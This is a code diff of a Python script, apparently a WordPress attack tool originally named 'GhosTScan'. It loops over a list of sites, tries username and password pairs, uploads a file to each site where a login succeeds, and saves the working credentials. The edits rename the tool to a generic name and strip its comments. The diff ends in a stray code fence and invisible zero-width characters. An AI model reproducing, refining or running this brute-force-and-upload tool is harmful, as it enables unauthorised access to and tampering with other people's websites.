@@ -1,6 +1,6 @@
+import requests
 import os
 import sys
-import requests
 
 def load_file(file_path):
     """Loads a file and returns its lines as a list."""
@@ -36,7 +36,7 @@ def upload_index(url, username, password):
 
 def main():
     if len(sys.argv) < 3:
-        print("Usage: python3 GhosTScan.py <wp_list> <result_file>")
+        print("Usage: python3 script_name.py <wp_list> <result_file>")
         sys.exit(1)
     
     wp_list_file = sys.argv[1]
@@ -55,10 +55,10 @@ def main():
                 if upload_index(wp_url, username, password):
                     print(f"[+] Success: {wp_url} with {username}/{password}")
                     success_results.append(f"{wp_url} - {username}/{password}")
-                    break  # Break only the password loop to move to next username
+                    break
             else:
-                continue  # If no password works, continue to next wp_url
-            break  # Break the username loop to move to next wp_url
+                continue
+            break
 
     with open(result_file, 'w') as file:
         for result in success_results:
@@ -68,3 +68,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+```​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
